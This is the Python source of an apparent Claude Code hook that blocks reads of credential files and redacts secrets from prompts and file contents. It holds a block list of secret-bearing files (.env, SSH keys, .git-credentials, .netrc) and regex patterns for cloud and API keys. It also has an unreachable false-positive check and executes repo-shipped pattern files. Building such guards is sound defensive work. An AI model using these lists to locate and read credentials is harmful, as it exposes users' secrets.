#!/usr/bin/env python3
"""
Claude Secret Shield — Protect your secrets from Claude Code

Strategy 1: Block list — certain files are never read (.env, credentials, etc.)
Strategy 2: Pattern-based redact — secrets in ANY file are replaced with consistent placeholders
Strategy 3: Restore on write — placeholders are restored to real values when writing files

Global mapping stored at:  ~/.claude/.redact-mapping.json (persistent across sessions)
HMAC key stored at:        ~/.claude/.redact-hmac-key (deterministic placeholders)
File backups stored at:    /tmp/.claude-backup-{session_id}/

Hook input (stdin JSON):
  - tool_name: "Read" | "Write" | "Edit" | "Bash"
  - tool_input: { file_path, content, command, ... }
  - session_id: string
  - tool_result: (only present for PostToolUse hooks)

Hook output (stdout JSON):
  hookSpecificOutput.hookEventName = "PreToolUse" | "PostToolUse"
  hookSpecificOutput.permissionDecision = "allow" | "deny"
  hookSpecificOutput.permissionDecisionReason = string (when deny)
  hookSpecificOutput.updatedInput = {...} (when allow with modifications)

Exit codes:
  0 = allow (or deny via JSON output)
  Non-zero without JSON = error (Claude Code shows stderr)
"""

import subprocess
import sys
import json
import os
import re
import base64
import hashlib
import hmac
import tempfile
import shutil
import fcntl
import fnmatch
import stat as stat_module
import time
import uuid

# ── Debug logging ────────────────────────────────────────────────────────
DEBUG = os.environ.get("REDACT_DEBUG", "0") == "1"


def debug_log(msg):
    """Log to stderr when REDACT_DEBUG=1."""
    if DEBUG:
        print(f"[redact-restore {time.strftime('%H:%M:%S')}] {msg}", file=sys.stderr)

# ── Global mapping path and HMAC key ─────────────────────────────────────
GLOBAL_MAPPING_PATH = os.path.expanduser("~/.claude/.redact-mapping.json")
MAX_MAPPING_ENTRIES = 10000


def get_or_create_hmac_key():
    """Load or create a per-user HMAC key for deterministic placeholder generation."""
    key_path = os.path.expanduser("~/.claude/.redact-hmac-key")
    os.makedirs(os.path.dirname(key_path), exist_ok=True)
    if os.path.exists(key_path):
        with open(key_path, 'rb') as f:
            return f.read()
    key = os.urandom(32)
    fd = os.open(key_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o400)
    with os.fdopen(fd, 'wb') as f:
        f.write(key)
    return key


HMAC_KEY = get_or_create_hmac_key()

# Derive a Fernet encryption key from the HMAC key for encrypting the mapping file.
# Fernet requires a 32-byte base64url-encoded key.
try:
    from cryptography.fernet import Fernet
    _fernet_key = base64.urlsafe_b64encode(hashlib.sha256(HMAC_KEY + b"mapping-encryption").digest())
    FERNET = Fernet(_fernet_key)
except ImportError:
    FERNET = None  # Fallback: plaintext (with warning on first use)


# ── Load patterns ────────────────────────────────────────────────────────
# Import from patterns.py in the same directory, or fall back to inline
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
_patterns_loaded = False

try:
    # Try importing from the installed location first
    sys.path.insert(0, _SCRIPT_DIR)
    from patterns import BLOCKED_FILES, SECRET_PATTERNS
    _patterns_loaded = True
except ImportError:
    pass

if not _patterns_loaded:
    # Also check ~/.claude/hooks/ (where the installer copies files)
    _hooks_dir = os.path.expanduser("~/.claude/hooks")
    if os.path.isfile(os.path.join(_hooks_dir, "patterns.py")):
        sys.path.insert(0, _hooks_dir)
        try:
            from patterns import BLOCKED_FILES, SECRET_PATTERNS
            _patterns_loaded = True
        except ImportError:
            pass

if not _patterns_loaded:
    # Minimal fallback if patterns.py cannot be found
    BLOCKED_FILES = [
        ".env", ".env.local", ".env.production", ".env.staging",
        "credential.json", "credentials.json", "secrets.yaml", "secrets.json",
        "id_rsa", "id_ed25519", "id_ecdsa", ".pem", ".p12", ".pfx",
        "service-account.json", ".git-credentials", ".netrc",
    ]
    SECRET_PATTERNS = [
        ("OPENAI_KEY", r'sk-(?:proj-|svcacct-|admin-)?[A-Za-z0-9_-]{20,}T3BlbkFJ[A-Za-z0-9_-]{20,}'),
        ("ANTHROPIC_KEY", r'sk-ant-[a-zA-Z0-9_\-]{32,100}'),
        ("AWS_ACCESS_KEY", r'(?:A3T[A-Z0-9]|AKIA|ASIA|ABIA|ACCA)[A-Z2-7]{16}'),
        ("GITHUB_PAT_CLASSIC", r'ghp_[A-Za-z0-9]{36}'),
        ("STRIPE_SECRET_KEY", r'sk_live_[A-Za-z0-9]{24,}'),
        ("PRIVATE_KEY_BLOCK", r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----'),
        ("GENERIC_SECRET", r'(?i)(?:secret|password|passwd|pwd)["\']?\s*[:=]\s*["\']?[^\s"\']{10,60}["\']?'),
    ]

# ── Load custom patterns (never overwritten by install.sh) ───────────────
#
# Two locations searched, in order:
#   1. Global       — _SCRIPT_DIR/custom-patterns.py  (~/.claude/hooks/)
#                     Shared across every project on this machine.
#   2. Per-project  — $CWD/.claude/custom-patterns.py
#                     A repo can ship its own patterns alongside its code
#                     so they travel with the project (committed + reviewed).
#                     Loaded second so per-project patterns can extend
#                     (not override) the global set.
#
# Both files share the same module surface:
#   CUSTOM_SECRET_PATTERNS = [("NAME", r"regex"), ...]
#   CUSTOM_BLOCKED_FILES   = ["sensitive.yaml", ...]
_LOADED_PATTERN_PATHS = set()


def _load_custom_patterns_from(path):
    """Idempotent — won't double-load the same file path.

    Also compiles any new regex and appends to COMPILED_PATTERNS so a
    later `_load_project_custom_patterns(payload_cwd)` from the
    dispatcher actually adds usable patterns (not just SECRET_PATTERNS
    list entries that nobody compiles)."""
    try:
        if not path or not os.path.exists(path):
            return
        abspath = os.path.abspath(path)
        if abspath in _LOADED_PATTERN_PATHS:
            return
        _LOADED_PATTERN_PATHS.add(abspath)

        import importlib.util
        spec = importlib.util.spec_from_file_location(
            f"custom_patterns_{abs(hash(abspath))}", abspath
        )
        custom_mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(custom_mod)
        if hasattr(custom_mod, "CUSTOM_SECRET_PATTERNS"):
            for name, regex in custom_mod.CUSTOM_SECRET_PATTERNS:
                SECRET_PATTERNS.append((name, regex))
                # Compile incrementally if COMPILED_PATTERNS already exists
                # (i.e. we're past initial module load and being called from
                # dispatcher with payload cwd).
                if "COMPILED_PATTERNS" in globals():
                    try:
                        COMPILED_PATTERNS.append((name, re.compile(regex)))
                    except re.error:
                        pass
        if hasattr(custom_mod, "CUSTOM_BLOCKED_FILES"):
            BLOCKED_FILES.extend(custom_mod.CUSTOM_BLOCKED_FILES)
    except Exception:
        # Never let a malformed user file crash the hook.
        pass


_load_custom_patterns_from(os.path.join(_SCRIPT_DIR, "custom-patterns.py"))


_PROJECT_MARKERS = (
    os.path.join(".claude", "custom-patterns.py"),
    ".git",
    ".hg",
)


def _walk_up_for_marker(start_dir):
    """Walk from `start_dir` upward (toward /) looking for any
    `_PROJECT_MARKERS` entry. Returns the directory containing the first
    match, or None if none found. Stops at filesystem root.

    Codex R3 [P1]: a user invoking Claude from `<repo>/src/...` should
    still trigger the repo-root's `.claude/custom-patterns.py`. Without
    this walk-up, the loader misses anything not directly in the cwd.
    """
    if not start_dir:
        return None
    try:
        d = os.path.abspath(start_dir)
    except OSError:
        return None
    seen = set()
    while d and d not in seen and d != os.path.dirname(d):
        seen.add(d)
        for marker in _PROJECT_MARKERS:
            if os.path.exists(os.path.join(d, marker)):
                return d
        d = os.path.dirname(d)
    return None


def _resolve_project_dir(payload_cwd=None):
    """
    Find the project root for loading per-project custom-patterns.py.

    For each candidate start dir, walk upward looking for either
    `.claude/custom-patterns.py` directly OR a VCS marker (`.git`,
    `.hg`). Falls through to next candidate if no marker found.

    Candidate priority:
      1. Explicit `payload_cwd` (hook payload's `cwd` field) — most
         authoritative when available (Codex R2 [P2]).
      2. $CLAUDE_PROJECT_DIR — Claude Code sets this in the hook env.
      3. `os.getcwd()` — last-resort fallback.

    Returns None if no candidate yields a marker.
    """
    candidates = []
    if payload_cwd:
        candidates.append(payload_cwd)
    env_dir = os.environ.get("CLAUDE_PROJECT_DIR")
    if env_dir:
        candidates.append(env_dir)
    try:
        candidates.append(os.getcwd())
    except OSError:
        pass

    for c in candidates:
        if not c or not os.path.isdir(c):
            continue
        root = _walk_up_for_marker(c)
        if root:
            return root
    return None


def _load_project_custom_patterns(payload_cwd=None):
    """
    Load (or re-load, idempotently) per-project custom patterns.

    The dispatcher should call this with `data.get("cwd")` early in each
    hook event so the authoritative payload-cwd path is honoured even if
    the interpreter's getcwd() and env are wrong.
    """
    target_dir = _resolve_project_dir(payload_cwd)
    if not target_dir:
        return
    _load_custom_patterns_from(os.path.join(target_dir, ".claude", "custom-patterns.py"))


_load_project_custom_patterns()

# ── Compile patterns once ────────────────────────────────────────────────
# (Subsequent `_load_project_custom_patterns(payload_cwd)` calls from the
# dispatcher will compile new patterns incrementally in-place — see
# `_load_custom_patterns_from` above.)
COMPILED_PATTERNS = []
for name, regex in SECRET_PATTERNS:
    try:
        COMPILED_PATTERNS.append((name, re.compile(regex)))
    except re.error:
        pass

# ── Placeholder shape ────────────────────────────────────────────────────
# `{{NAME_deadbeef}}` — an 8-hex HMAC digest, with `x` appended on the
# (unlikely) collision path in get_placeholder().
PLACEHOLDER_RE = re.compile(r'\{\{[A-Z0-9_]+_[a-f0-9]{8}x*\}\}')


# ── Failure evidence ─────────────────────────────────────────────────────
# This hook fails open on purpose: a bug in it must never block the user's
# work. But a fail-open branch that leaves no evidence is indistinguishable
# from one that works. That is not hypothetical — a NameError inside the
# restore path once disabled the entire protection, absolute paths included,
# and the only trace was a single stderr line nobody reads.
#
# So every failure gets recorded twice, because the two records fail
# differently:
#   - a durable JSON line here, which survives the session and can be
#     grepped after the fact ("when did this start?");
#   - an in-band PostToolUse warning, which is what somebody actually sees
#     at the moment the file on disk is wrong and still fixable.
SHIELD_ERROR_LOG = os.path.expanduser("~/.claude/vault/restore-errors.log")
SHIELD_ERROR_LOG_MAX_BYTES = 1_000_000
SHIELD_ERROR_LOG_KEEP_LINES = 200
SHIELD_ERROR_LOG_LOCK = SHIELD_ERROR_LOG + ".lock"


def scrub_secrets(text, limit=500):
    """Truncate and strip anything that looks like a secret.

    The log records failures, never values. Placeholder NAMES are safe by
    construction; an exception message that happens to quote file content
    is not.
    """
    try:
        out = str(text)[:limit]
        for _name, compiled in COMPILED_PATTERNS:
            out = compiled.sub("<redacted>", out)
        return out
    except Exception:
        return "<unprintable>"


def record_shield_failure(kind, **fields):
    """Append one JSON line to ~/.claude/vault/restore-errors.log.

    Never raises — this is the thing that runs when everything else already
    went wrong.
    """
    try:
        entry = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "kind": kind}
        entry.update(fields)
        line = json.dumps(entry, default=str) + "\n"
        log_dir = os.path.dirname(SHIELD_ERROR_LOG)
        os.makedirs(log_dir, mode=0o700, exist_ok=True)

        # Rotation and the append are ONE critical section. Rotation is
        # read-tail-then-rewrite, and hook processes run concurrently — one per
        # tool call. Unserialised, two of them both read the tail, both rewrite
        # the file, and any line appended in between is gone: the failure log
        # losing the failure it exists to record, at the exact moment several
        # things are going wrong at once. The lock is a sidecar file because the
        # rewrite commits with os.replace(), so the log's inode changes and a
        # lock held on it would not exclude the next writer.
        lock_fd = None
        try:
            lock_fd = os.open(SHIELD_ERROR_LOG_LOCK, os.O_RDWR | os.O_CREAT, 0o600)
            fcntl.flock(lock_fd, fcntl.LOCK_EX)
        except OSError:
            if lock_fd is not None:
                os.close(lock_fd)
                lock_fd = None
        try:
            tmp_path = None
            try:
                if os.path.getsize(SHIELD_ERROR_LOG) > SHIELD_ERROR_LOG_MAX_BYTES:
                    with open(SHIELD_ERROR_LOG) as f:
                        tail = f.readlines()[-SHIELD_ERROR_LOG_KEEP_LINES:]
                    fd, tmp_path = tempfile.mkstemp(
                        dir=log_dir, prefix=".restore-errors.", suffix=".tmp")
                    with os.fdopen(fd, "w") as f:
                        f.writelines(tail)
                    os.replace(tmp_path, SHIELD_ERROR_LOG)
                    tmp_path = None
            except OSError:
                pass
            finally:
                if tmp_path and os.path.exists(tmp_path):
                    try:
                        os.remove(tmp_path)
                    except OSError:
                        pass
            fd = os.open(SHIELD_ERROR_LOG, os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
            with os.fdopen(fd, "a") as f:
                f.write(line)
        finally:
            if lock_fd is not None:
                try:
                    fcntl.flock(lock_fd, fcntl.LOCK_UN)
                finally:
                    os.close(lock_fd)
        debug_log(f"Recorded shield failure ({kind}) in {SHIELD_ERROR_LOG}")
    except Exception:
        pass


_POST_WARNINGS = []


def queue_post_warning(text):
    """Hold a message for the single PostToolUse JSON response."""
    if text not in _POST_WARNINGS:
        _POST_WARNINGS.append(text)


def flush_post_warnings():
    """Emit queued warnings as PostToolUse additionalContext.

    additionalContext is the only channel from a PostToolUse hook that
    reaches the conversation, and reaching the conversation is the entire
    point: the file on disk is wrong right now, and the person who can act
    on that is reading this transcript.
    """
    if not _POST_WARNINGS:
        return
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PostToolUse",
            "additionalContext": "\n\n".join(_POST_WARNINGS),
        }
    }))
    del _POST_WARNINGS[:]


def report_crash(exc):
    """Record + announce a crash that the fail-open handler swallowed."""
    import traceback

    event, tool, path = "", "", ""
    try:
        payload = input_data if isinstance(input_data, dict) else {}
        event = payload.get("hook_event_name", "") or ""
        tool = payload.get("tool_name", "") or ""
        tool_in = payload.get("tool_input")
        if isinstance(tool_in, dict):
            path = tool_in.get("file_path", "") or ""
        is_post = (
            event == "PostToolUse"
            or "tool_result" in payload
            or "tool_response" in payload
        )
    except Exception:
        is_post = False

    record_shield_failure(
        "exception",
        hook_event=event,
        tool=tool,
        path=path,
        error=scrub_secrets(f"{exc.__class__.__name__}: {exc}"),
        traceback=scrub_secrets(traceback.format_exc()[-2000:], limit=2000),
    )

    if is_post:
        queue_post_warning(
            "[claude-secret-shield] The placeholder-restore pass for this tool "
            f"call crashed ({scrub_secrets(exc.__class__.__name__, 80)}), so it "
            "did not run. Any file this call touched may still hold a "
            "`{{NAME_hash}}` placeholder instead of the real value — check it "
            "before committing or deploying, and tell the user. "
            f"Details: {SHIELD_ERROR_LOG}"
        )
        flush_post_warnings()


# ── Binary file detection ────────────────────────────────────────────────
def is_binary_file(file_path):
    """Return True if the file appears to be binary (contains null bytes in first 8KB)."""
    try:
        with open(file_path, 'rb') as f:
            chunk = f.read(8192)
            return b'\x00' in chunk
    except (OSError, PermissionError):
        return False


# ── Allowlist (.claude-redact-ignore) ────────────────────────────────────
def is_ignored(file_path):
    """Check if file matches any pattern in .claude-redact-ignore."""
    for ignore_file in [os.path.join(os.getcwd(), '.claude-redact-ignore'),
                        os.path.expanduser('~/.claude-redact-ignore')]:
        if os.path.exists(ignore_file):
            try:
                with open(ignore_file) as f:
                    for pattern in f:
                        pattern = pattern.strip()
                        if pattern and not pattern.startswith('#'):
                            if fnmatch.fnmatch(file_path, pattern) or fnmatch.fnmatch(os.path.basename(file_path), pattern):
                                debug_log(f"File {file_path} ignored by pattern '{pattern}' in {ignore_file}")
                                return True
            except (OSError, PermissionError):
                pass
    return False


# ── Read hook input ──────────────────────────────────────────────────────
try:
    input_data = json.loads(sys.stdin.read())
except (json.JSONDecodeError, EOFError):
    debug_log("No valid JSON on stdin, exiting")
    sys.exit(0)

if not isinstance(input_data, dict):
    debug_log(f"Input is not a dict (type={type(input_data).__name__}), exiting")
    sys.exit(0)


def get_prompt_text(payload):
    """Extract the user prompt across Claude Code variants and wrappers."""
    candidates = [payload]
    nested = payload.get("data")
    if isinstance(nested, dict):
        candidates.append(nested)

    for candidate in candidates:
        for key in ("user_prompt", "prompt", "message"):
            value = candidate.get(key)
            if isinstance(value, str) and value:
                return value
    return ""


def get_prompt_storage_dir(payload):
    """Prefer Claude-provided project cwd over the hook process cwd."""
    for key in ("cwd", "project_dir"):
        value = payload.get(key)
        if isinstance(value, str) and value:
            return value
    return os.environ.get("CLAUDE_PROJECT_DIR") or os.getcwd()


def get_session_id(payload):
    """Extract a stable session identifier for prompt continuation state."""
    value = payload.get("session_id")
    if isinstance(value, str) and value:
        return value
    return "default"


def get_agent_scope(payload):
    """Scope prompt continuation to the current agent when available."""
    for key in ("agent_id", "agent_type", "transcript_path"):
        value = payload.get(key)
        if isinstance(value, str) and value:
            return value
    return "main"


def get_prompt_state_key(payload):
    """Use session + agent scope so parallel subagents do not share state."""
    return f"{get_session_id(payload)}::{get_agent_scope(payload)}"


def get_session_state_path(state_key):
    """Store per-agent prompt continuation state outside the repo."""
    session_hash = hashlib.sha256(state_key.encode("utf-8", errors="replace")).hexdigest()[:16]
    return os.path.join(tempfile.gettempdir(), f".claude-secret-shield-{session_hash}.json")


def load_session_state(state_key):
    path = get_session_state_path(state_key)
    try:
        with open(path, "r") as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError):
        return None


def save_session_state(state_key, state):
    path = get_session_state_path(state_key)
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w") as f:
        json.dump(state, f)


def delete_session_state(state_key):
    path = get_session_state_path(state_key)
    try:
        if os.path.exists(path):
            os.remove(path)
    except OSError:
        pass


def build_redacted_prompt(prompt):
    """Create a redacted copy of the prompt for safe additionalContext."""
    matches = []
    counters = {}

    for pattern_name, compiled_re in COMPILED_PATTERNS:
        for m in compiled_re.finditer(prompt):
            matched_value = m.group(0)
            if len(matched_value) < 8:
                continue
                # Skip false positives: bare camelCase variable names in GENERIC_SECRET
                # e.g. 'password: newPassword,' — newPassword is code, not a real secret
                if pattern_name == 'GENERIC_SECRET':
                    _parts = matched_value.split('=', 1) if '=' in matched_value else matched_value.split(':', 1)
                    if len(_parts) == 2:
                        _val = _parts[1].strip().strip('"\'').rstrip(',;) \\n')
                        if re.match(r'^[a-z][a-zA-Z]{2,}$', _val):
                            continue
            preview = matched_value[:6] + "..." + matched_value[-4:] if len(matched_value) > 14 else matched_value[:4] + "..."
            counters[pattern_name] = counters.get(pattern_name, 0) + 1
            placeholder = "{{" + f"{pattern_name}_{counters[pattern_name]}" + "}}"
            matches.append((m.start(), m.end(), pattern_name, matched_value, preview, placeholder))

    if not matches:
        return prompt, []

    matches.sort(key=lambda x: x[0], reverse=True)
    redacted = prompt
    used_ranges = []
    found_secrets = []
    for start, end, pattern_name, matched_value, preview, placeholder in matches:
        if any(start < used_end and end > used_start for used_start, used_end in used_ranges):
            continue
        redacted = redacted[:start] + placeholder + redacted[end:]
        used_ranges.append((start, end))
        found_secrets.append((pattern_name, preview))

    found_secrets.reverse()
    return redacted, found_secrets


def cleanup_prompt_artifacts_from_paths(*paths):
    """Delete temporary prompt files created for the go/continue flow."""
    for path in paths:
        if not path:
            continue
        try:
            if os.path.exists(path):
                os.remove(path)
                debug_log(f"Deleted prompt artifact: {path}")
        except OSError:
            pass


def cleanup_prompt_artifacts_in_dir(base_dir):
    """Best-effort cleanup for both legacy and nonce prompt temp files."""
    if not base_dir or not os.path.isdir(base_dir):
        return
    for name in os.listdir(base_dir):
        if re.match(r"^\.tmp_secrets(?:\.[a-f0-9]{12})?(?:\.prompt\.txt|\.conf)$", name):
            cleanup_prompt_artifacts_from_paths(os.path.join(base_dir, name))


def cleanup_legacy_prompt_artifacts_in_dir(base_dir):
    """Only clean up legacy shared prompt temp files."""
    if not base_dir or not os.path.isdir(base_dir):
        return
    for name in (".tmp_secrets.conf", ".tmp_secrets.prompt.txt"):
        cleanup_prompt_artifacts_from_paths(os.path.join(base_dir, name))


def cleanup_prompt_artifacts_for_session(state_key):
    state = load_session_state(state_key)
    if not state:
        return
    cleanup_prompt_artifacts_from_paths(state.get("tmp_file"), state.get("tmp_context_file"))
    delete_session_state(state_key)


# ── Tmp-secrets exclude registration (moved above handlers so it's in
# scope when UserPromptSubmit fires) ───────────────────────────────────
TMP_SECRETS_EXCLUDES = [
    "/.tmp_secrets.conf",
    "/.tmp_secrets.prompt.txt",
    "/.tmp_secrets.*.conf",
    "/.tmp_secrets.*.prompt.txt",
]


def _find_repo_root(start_dir):
    d = os.path.abspath(start_dir) if start_dir else None
    while d and d != os.path.dirname(d):
        marker = os.path.join(d, ".git")
        if os.path.isdir(marker) or os.path.isfile(marker):
            return d
        d = os.path.dirname(d)
    return None


def _ensure_git_exclude(repo_root, entries):
    """Idempotently append `entries` to git's local exclude list
    (<repo>/.git/info/exclude, or the worktree's equivalent). Uses
    `git rev-parse --git-path info/exclude` so it handles linked
    worktrees correctly. Fails silently — housekeeping only."""
    if not repo_root:
        return
    try:
        r = subprocess.run(
            ["git", "-C", repo_root, "rev-parse", "--git-path", "info/exclude"],
            capture_output=True, text=True, timeout=3,
        )
        exclude_path = r.stdout.strip() if r.returncode == 0 else ""
        if not exclude_path:
            return
        if not os.path.isabs(exclude_path):
            exclude_path = os.path.join(repo_root, exclude_path)
        os.makedirs(os.path.dirname(exclude_path), exist_ok=True)
        existing = set()
        if os.path.isfile(exclude_path):
            with open(exclude_path, "r", encoding="utf-8") as f:
                existing = set(f.read().splitlines())
        to_add = [e for e in entries if e not in existing]
        if not to_add:
            return
        with open(exclude_path, "a", encoding="utf-8") as f:
            if existing:
                f.write("\n")
            f.write("# Added by redmem (shield)\n")
            for e in to_add:
                f.write(e + "\n")
        debug_log(f"Added tmp-secret patterns to {exclude_path}")
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
        debug_log(f"git-exclude register skipped: {e.__class__.__name__}")


try:
    # ══════════════════════════════════════════════════════════════════════════
    # UserPromptSubmit: Scan user prompt for secrets before sending to API
    # ══════════════════════════════════════════════════════════════════════════
    hook_event = input_data.get("hook_event_name", "")
    if hook_event == "UserPromptSubmit":
        prompt = get_prompt_text(input_data)
        prompt_dir = get_prompt_storage_dir(input_data)
        state_key = get_prompt_state_key(input_data)

        # ── Helper: build "go" continuation response ────────────────────────
        def _build_go_response(state):
            """Build additionalContext for go/pass continuation."""
            tmp_file = state.get("tmp_file")
            tmp_context_file = state.get("tmp_context_file")
            if not tmp_file or not os.path.exists(tmp_file):
                return None
            redacted_prompt = ""
            try:
                with open(tmp_context_file, "r") as tf:
                    redacted_prompt = tf.read().strip()
            except OSError:
                pass
            additional_context = (
                "[claude-secret-shield] The user's previous prompt was blocked because it "
                "contained secrets. This message is confirmation to continue that same request.\n\n"
                f"Read {tmp_file} now. That file is safe to read because secrets will be shown "
                "to you as redacted placeholders.\n\n"
                "Important: treat those placeholders as the actual values for the task. If you "
                "need to write files, edit files, or run commands, use the placeholders exactly "
                "as they appear. claude-secret-shield will automatically restore the real secret "
                "values before execution when appropriate.\n\n"
                "Do not ask the user to manually substitute the values or run the command "
                "themselves just because the secrets are redacted. Continue the original "
                "request normally using the placeholderized values."
            )
            if redacted_prompt:
                additional_context += f"\n\nPreviously blocked prompt (redacted):\n{redacted_prompt}"
            return additional_context

        # ── Check "pass" bypass counter ─────────────────────────────────────
        # pass_remaining: >0 = allow N prompts, -1 = disabled for session, 0/absent = normal
        state = load_session_state(state_key)
        pass_remaining = (state or {}).get("pass_remaining", 0)

        if prompt:
            redacted_prompt, found_secrets = build_redacted_prompt(prompt)
            if found_secrets:
                # Check if pass bypass is active
                if pass_remaining == -1:
                    # pass off — disabled for session, allow through
                    debug_log("UserPromptSubmit: pass off active, allowing prompt with secrets")
                    sys.exit(0)
                if pass_remaining > 0:
                    # Decrement pass counter and allow
                    new_remaining = pass_remaining - 1
                    if state:
                        state["pass_remaining"] = new_remaining
                        save_session_state(state_key, state)
                    debug_log(f"UserPromptSubmit: pass active ({new_remaining} remaining), allowing")
                    sys.exit(0)

                # Normal block flow
                nonce = uuid.uuid4().hex[:12]
                tmp_file = os.path.join(prompt_dir, f".tmp_secrets.{nonce}.conf")
                tmp_context_file = os.path.join(prompt_dir, f".tmp_secrets.{nonce}.prompt.txt")
                secret_list = ", ".join(f"{n} ({p})" for n, p in found_secrets[:5])
                extra = f" and {len(found_secrets) - 5} more" if len(found_secrets) > 5 else ""
                # Save the full prompt plus a redacted companion so "go" can restore intent safely.
                try:
                    os.makedirs(prompt_dir, exist_ok=True)
                    with open(tmp_file, "w") as tf:
                        tf.write(prompt)
                    with open(tmp_context_file, "w") as tf:
                        tf.write(redacted_prompt)
                    os.chmod(tmp_file, 0o600)
                    os.chmod(tmp_context_file, 0o600)
                    # Register patterns in .git/info/exclude proactively on
                    # FIRST create (not just on Read), so these files never
                    # show up in `git status` even if Claude never reads them.
                    _ensure_git_exclude(_find_repo_root(prompt_dir),
                                        TMP_SECRETS_EXCLUDES)
                    previous_state = load_session_state(state_key)
                    new_state = {
                        "nonce": nonce,
                        "prompt_dir": prompt_dir,
                        "tmp_file": tmp_file,
                        "tmp_context_file": tmp_context_file,
                        "pass_remaining": 0,
                    }
                    save_session_state(state_key, new_state)
                    if previous_state:
                        cleanup_prompt_artifacts_from_paths(
                            previous_state.get("tmp_file"),
                            previous_state.get("tmp_context_file"),
                        )
                    debug_log(f"Saved prompt to {tmp_file}")
                    saved = True
                except OSError as e:
                    debug_log(f"Failed to save prompt: {e}")
                    saved = False
                if saved:
                    reason = (
                        f"🛡️ claude-secret-shield: secret detected ({secret_list}{extra}).\n\n"
                        f"Your prompt has been safely saved. Secrets will be auto-redacted when read.\n\n"
                        f"Reply:\n"
                        f"  \"go\"       — continue with secrets auto-redacted\n"
                        f"  \"pass\"     — allow this prompt as-is (bypass redaction once)\n"
                        f"  \"pass N\"   — bypass for this + next N-1 prompts\n"
                        f"  \"pass off\" — disable prompt scanning for this session"
                    )
                else:
                    reason = (
                        f"🛡️ claude-secret-shield: secret detected ({secret_list}{extra}).\n\n"
                        f"Could not save prompt automatically.\n"
                        f"Please save your secret to .tmp_secrets.conf, then tell Claude to read it."
                    )
                debug_log(f"UserPromptSubmit BLOCKED: {[n for n,_ in found_secrets]}")
                print(json.dumps({
                    "decision": "block",
                    "reason": reason
                }))
                sys.exit(0)

        # ── Check "go" to continue from a blocked prompt ────────────────────
        if prompt.strip().lower() in ("go", "go.", "继续", "continue"):
            state = load_session_state(state_key)
            if state:
                additional_context = _build_go_response(state)
                if additional_context:
                    debug_log("UserPromptSubmit: 'go' detected, adding context")
                    print(json.dumps({
                        "hookSpecificOutput": {
                            "hookEventName": "UserPromptSubmit",
                            "additionalContext": additional_context
                        }
                    }))
                    sys.exit(0)

        # ── Check "pass" / "pass N" / "pass off" command ────────────────────
        pass_match = re.match(r'^pass(?:\s+(off|\d+))?\s*$', prompt.strip().lower())
        if pass_match:
            state = load_session_state(state_key)
            if state and state.get("tmp_file") and os.path.exists(state.get("tmp_file", "")):
                arg = pass_match.group(1)
                if arg == "off":
                    pass_count = -1  # sentinel: disabled for session
                    debug_log("UserPromptSubmit: 'pass off' — disabling prompt scanning for session")
                elif arg:
                    pass_count = min(max(int(arg), 1), 100)
                    debug_log(f"UserPromptSubmit: 'pass {pass_count}' — allowing {pass_count} prompts")
                else:
                    pass_count = 1  # pass = pass 1
                    debug_log("UserPromptSubmit: 'pass' — allowing current prompt")

                # Set pass_remaining for FUTURE prompts (current one is handled by go mechanism)
                # pass 1 = allow current only → future remaining = 0
                # pass 3 = allow current + 2 more → future remaining = 2
                # pass off = disable → future remaining = -1
                if pass_count == -1:
                    state["pass_remaining"] = -1
                else:
                    state["pass_remaining"] = max(pass_count - 1, 0)
                save_session_state(state_key, state)

                # Allow current prompt through (same as "go" but without redaction context)
                additional_context = (
                    "[claude-secret-shield] The user used 'pass' to bypass secret scanning for this prompt. "
                    "The original prompt contained values that triggered secret detection, but the user "
                    "confirmed they are safe to send (e.g. transaction hashes, not private keys).\n\n"
                    "Proceed with the user's original request. The prompt content will be sent as-is."
                )
                # Re-read the original prompt
                try:
                    with open(state["tmp_file"], "r") as tf:
                        original_prompt = tf.read().strip()
                    additional_context += f"\n\nOriginal prompt:\n{original_prompt}"
                except OSError:
                    pass

                print(json.dumps({
                    "hookSpecificOutput": {
                        "hookEventName": "UserPromptSubmit",
                        "additionalContext": additional_context
                    }
                }))
                sys.exit(0)

        # No secrets found — allow prompt
        debug_log("UserPromptSubmit: no secrets found, allowing")
        sys.exit(0)

    tool_name = input_data.get("tool_name", "")
    tool_input = input_data.get("tool_input", {})
    session_id = input_data.get("session_id", "default")
    # Detect PostToolUse: prefer the authoritative hook_event_name when
    # Claude Code provides it; fall back to payload-shape sniffing for
    # legacy clients. Bug fix 2026-05-24: older code only checked
    # `tool_result`, but current Claude Code sends `tool_response`, so
    # PostToolUse events were misclassified as PreToolUse — the Bash
    # branch would re-emit a `permissionDecision` JSON with
    # `hookEventName: "PreToolUse"`, which Claude Code rejected with
    # "Hook returned incorrect event name".
    _hook_event = input_data.get("hook_event_name", "")
    is_post_hook = (
        _hook_event == "PostToolUse"
        or "tool_result" in input_data
        or "tool_response" in input_data
    )

    debug_log(f"Hook start: tool={tool_name} post={is_post_hook} session={session_id}")

    MAPPING_FILE = GLOBAL_MAPPING_PATH
    MAPPING_LOCK_FILE = GLOBAL_MAPPING_PATH + ".lock"
    BACKUP_DIR = os.path.join(tempfile.gettempdir(), f".claude-backup-{session_id}")


    # ── Backup management ───────────────────────────────────────────────────
    def backup_path_for(file_path):
        """Get the backup file path prefix for a given original file."""
        path_hash = hashlib.sha256(file_path.encode()).hexdigest()[:16]
        return os.path.join(BACKUP_DIR, path_hash)


    def restore_pending_backups():
        """Restore any pending backups from a previous crash."""
        if not os.path.isdir(BACKUP_DIR):
            return
        for entry in os.listdir(BACKUP_DIR):
            if not entry.endswith(".meta"):
                continue
            meta_path = os.path.join(BACKUP_DIR, entry)
            try:
                with open(meta_path) as f:
                    meta = json.load(f)
                original_path = meta["original_path"]
                bak_path = os.path.join(BACKUP_DIR, entry[:-5] + ".bak")
                if os.path.exists(bak_path) and os.path.isfile(original_path):
                    # Safety check: if the file on disk has different content
                    # than the backup, a Write/Edit already overwrote it.
                    # Restoring the backup would silently discard that write.
                    # Only restore if the file still matches the redacted state
                    # (i.e., the tool never ran or failed before writing).
